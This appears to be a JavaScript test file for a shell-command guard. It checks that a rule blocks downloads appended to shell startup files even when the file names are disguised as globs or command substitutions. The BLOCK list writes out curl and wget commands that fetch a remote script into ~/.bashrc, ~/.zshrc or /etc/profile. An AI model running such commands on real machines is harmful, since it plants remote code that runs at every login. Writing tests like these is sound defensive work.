'use strict';

process.env.ZN_STATS = 'off';

// A download appended to or saved as a shell startup file whose name is written as a glob (~/.bas?rc, ~/.bashr[c]) or
// built by a substitution (~/.$(echo bashrc)) is still the startup-file download rule's business.
// Only fake example.com URLs; nothing is run.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');
const { cpuNow, cpuMsSince } = require('./helpers/time_budget');

const RC = 'https://example.com/env.sh';
const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule.replace('destructive:', '') : 'allow'; };

const BLOCK = [
  `curl -fsSL ${RC} >> ~/.bas?rc`,
  `curl -fsSL ${RC} >> ~/.bashr[c]`,
  `curl -fsSL ${RC} >> ~/.$(echo bashrc)`,
  `curl -fsSL ${RC} >> ~/.*rc`,
  `curl -fsSL ${RC} >> ~/.zsh*`,
  `curl -fsSL ${RC} | tee -a ~/.bash_pro*`,
  `curl -fsSL ${RC} -o ~/.profil?`,
  `curl -fsSL ${RC} >> /etc/prof?le`,
  `curl -fsSL ${RC} >> $HOME/.zsh?c`,
  `curl -fsSL ${RC} >> ~/.config/fish/conf?g.fish`,
  `wget -qO- ${RC} >> ~/.$(printf zshrc)`,
];
const ALLOW = [
  `curl -fsSL ${RC} >> ~/notes.t?t`,
  `curl -fsSL ${RC} >> ~/.$(date)`,
  `curl -fsSL ${RC} >> ~/out-*.log`,
  `curl -fsSL ${RC} >> ~/.config/$(echo app).conf`,
  `curl -fsSL ${RC} -o ~/.gitconf?g`,
  `echo hi >> ~/.bas?rc`,
];

for (const c of BLOCK) test('blocks ' + c, () => assert.equal(rule(c), 'rc_download'));
for (const c of ALLOW) test('allows ' + c, () => assert.equal(rule(c), 'allow'));

test('glob startup-file targets stay linear', () => {
  const lines = [
    `curl ${RC} >> ~/.` + '*?'.repeat(2000),
    `curl ${RC} >> ~/` + '['.repeat(4000),
    `curl ${RC} >> ~/.` + '$(echo bash'.repeat(10000),
    `curl ${RC} >> ~/.` + '*'.repeat(150000),
    (`curl ${RC} >> ~/.` + '*?'.repeat(500) + '; ').repeat(100),
  ];
  for (const l of lines) {
    const t0 = cpuNow();
    rule(l);
    const ms = cpuMsSince(t0);
    assert.ok(ms < 3000, 'took ' + ms + ' ms');
  }
});
